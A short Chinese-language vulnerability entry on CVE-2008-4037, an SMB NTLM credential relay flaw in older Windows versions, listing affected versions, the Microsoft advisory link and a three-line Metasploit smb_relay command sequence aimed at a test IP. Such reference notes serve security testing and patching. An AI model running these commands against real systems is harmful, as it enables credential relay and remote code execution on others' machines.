### CVE-2008-4037

#### 描述

通过远程SMB服务器可以重播客户端用户的NTLM凭据在客户端计算机上执行任意代码

#### 影响版本

| Product             | Version | Update  | Edition | Tested |
| ------------------- | ------- | ------- | ------- | ------ |
| Windows XP          |         | SP2     |         |        |
| Windows XP          |         | SP2     | X64     |        |
| Windows XP          |         | SP3     |         |        |
| Windows XP          |         | Unknown | X64     |        |
| Windows Server 2003 |         | SP1     | Itanium |        |
| Windows Server 2003 |         | SP2     |         |        |
| Windows Server 2003 |         | SP2     | Itanium |        |
| Windows Server 2003 |         | SP2     | X64     |        |
| Windows Server 2003 |         | Unknown | X64     |        |
| Windows Server 2003 |         | SP1     |         |        |
| Windows 2000        | -       | SP4     |         |        |
| Windows Server 2008 | -       |         | X32     |        |
| Windows Server 2008 | -       |         | X64     |        |
| Windows Server 2008 | -       |         | Itanium |        |
| Windows Vista       | -       | SP1     | X64     |        |
| Windows Vista       | -       |         |         |        |
| Windows Vista       | -       |         | X64     |        |
| Windows Vista       | -       | SP1     |         |        |

#### 修复补丁

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2008-4037
```

#### 利用方式

使用msf 测试系统windows server 2003 sp2 x86

```
use exploit/windows/smb/smb_relay
set SMBHOST 192.168.1.14 #目标IP
run
```

![image-20200823142846532](https://github.com/Ascotbe/Random-img/blob/master/WindowsKernelExploits/CVE-2008-4037_win2003_x86_msf.png?raw=true)

